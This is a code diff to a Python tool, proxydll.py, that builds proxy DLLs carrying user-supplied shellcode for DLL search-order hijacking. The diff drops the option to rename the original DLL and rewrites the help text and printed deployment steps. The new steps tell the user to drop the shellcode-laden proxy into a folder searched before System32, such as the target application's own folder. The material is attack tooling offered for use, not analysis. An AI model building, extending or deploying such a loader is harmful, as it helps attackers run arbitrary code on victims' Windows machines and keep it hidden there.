@@ -45,16 +45,14 @@ Examples
   # Build only x64 proxy, custom output name
   python proxydll.py -dll version.dll -shellcode payload.bin -arch x64 -o myproxy
 
-  # Specify the renamed-original DLL name and keep generated sources
-  python proxydll.py -dll target.dll -shellcode shell.bin \\
-      --orig-name target_backup --keep-sources
+  # Inspect generated sources
+  python proxydll.py -dll target.dll -shellcode shell.bin --keep-sources -v
 
 Deployment
 ----------
-  1. Rename the original target.dll  →  <orig-name>.dll
-  2. Drop the generated proxy .dll   →  target.dll  (same directory)
-  3. Both DLLs must be in the same directory (or target.dll in a higher-
-     priority search path directory).
+  Drop the generated proxy .dll into a directory that is searched before
+  System32 (e.g. the target application's own folder).  The proxy loads
+  the real DLL directly from System32 at runtime — no rename needed.
         """,
     )
 
@@ -84,14 +82,6 @@ Deployment
         "-o", "--output",
         metavar="NAME",
         help="Output DLL base name without extension (default: same as input DLL)",
-    )
-    p.add_argument(
-        "--orig-name",
-        metavar="ORIG_NAME",
-        help=(
-            "Base name (no extension) the original DLL will be renamed to. "
-            "Default: <dll_name>_orig"
-        ),
     )
     p.add_argument(
         "--output-dir",
@@ -160,7 +150,6 @@ def main() -> int:
     # ------------------------------------------------------------------
     dll_basename = os.path.splitext(os.path.basename(args.dll))[0]
     proxy_name = args.output or dll_basename
-    orig_name = args.orig_name or f"{dll_basename}_orig"
 
     architectures: list[str] = (
         ["x64", "x86"] if args.arch == "all" else [args.arch]
@@ -208,7 +197,7 @@ def main() -> int:
 
     _info(f"Shellcode       : {args.shellcode} ({shellcode_size:,} bytes)")
     _info(f"Proxy DLL name  : {proxy_name}.dll")
-    _info(f"Original rename : {orig_name}.dll")
+    _info(f"Original DLL    : loaded from System32 at runtime")
     print()
 
     # ------------------------------------------------------------------
@@ -269,7 +258,6 @@ def main() -> int:
             c_path, asm_path, def_path, skipped = write_build_files(
                 build_dir=build_dir,
                 proxy_name=proxy_name,
-                orig_name=orig_name,
                 dll_info=dll_info,
                 shellcode_path=args.shellcode,
                 arch=arch,
@@ -331,10 +319,10 @@ def main() -> int:
                 print(f"    {out_dll}")
 
     print()
-    _info("Deployment steps:")
-    print(f"    1. Rename the original DLL:  {dll_basename}.dll  →  {orig_name}.dll")
-    print(f"    2. Copy the proxy DLL:        {proxy_name}.dll   →  target directory")
-    print( "    3. Both DLLs must reside in the same directory.")
+    _info("Deployment:")
+    print(f"    Copy {proxy_name}.dll to a directory that is searched before System32")
+    print(f"    (e.g. the target application's own folder).")
+    print(f"    The proxy loads the real {dll_basename}.dll from System32 at runtime.")
 
     return 0
 
